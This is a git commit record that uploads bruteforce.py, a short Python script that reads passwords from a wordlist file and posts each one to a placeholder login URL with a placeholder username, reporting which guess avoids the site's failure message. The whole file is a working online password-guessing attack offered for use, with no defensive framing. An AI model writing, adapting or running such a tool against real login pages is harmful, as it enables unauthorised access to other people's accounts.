f8eab0135f1c014ba50626c7180aeec2c3a4c415
mberkgökmen <89872172+mberkgokmen@users.noreply.github.com>
2022-03-24 21:56:18 +0300

    Add files via upload

---
+++ bruteforce.py
@@ -0,0 +1,12 @@
+import requests
+
+with open("password.txt") as passwords:
+    for password in passwords:
+        password = password.replace("\n", "")
+        payload = {'username' : '< Here is for username >', 'password': password}
+        hedef = requests.post("<Login page Url>", data=payload)
+        if "Your name or password is wrong. " in hedef.text: # You can change this according to website 
+            print(" Wrong Password: " + password)
+        else: 
+            print("True Password : " + password)
+            
